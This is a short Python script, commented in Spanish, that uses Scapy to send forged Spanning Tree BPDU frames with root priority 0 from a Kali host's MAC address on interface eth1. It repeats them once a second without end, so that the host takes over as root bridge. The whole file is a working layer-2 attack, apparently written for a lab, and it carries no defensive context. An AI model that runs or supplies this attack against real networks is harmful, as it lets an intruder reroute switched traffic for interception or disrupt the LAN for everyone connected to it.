from scapy.all import *

# Tu interfaz
iface = "eth1"

def stp_root_attack():
    print("Lanzando ataque definitivo... Reclamando el trono de STP.")
    
    # 1. Definimos la MAC del Kali (sacada de tus capturas)
    kali_mac = "00:0c:29:79:04:6a" 
    
    # 2. Construimos la BPDU con Prioridad 0 (La más alta jerarquía)
    # Usamos LLC para que el Switch lo reconozca como un paquete válido de red
    pkt = Dot3(dst="01:80:c2:00:00:00", src=kali_mac) / \
          LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
          STP(rootid=0, rootmac=kali_mac, bridgeid=0, bridgemac=kali_mac, portid=0x8001)
    
    # 3. Enviamos en bucle infinito cada 1 segundo
    sendp(pkt, iface=iface, inter=1, loop=1)

if __name__ == "__main__":
    stp_root_attack()

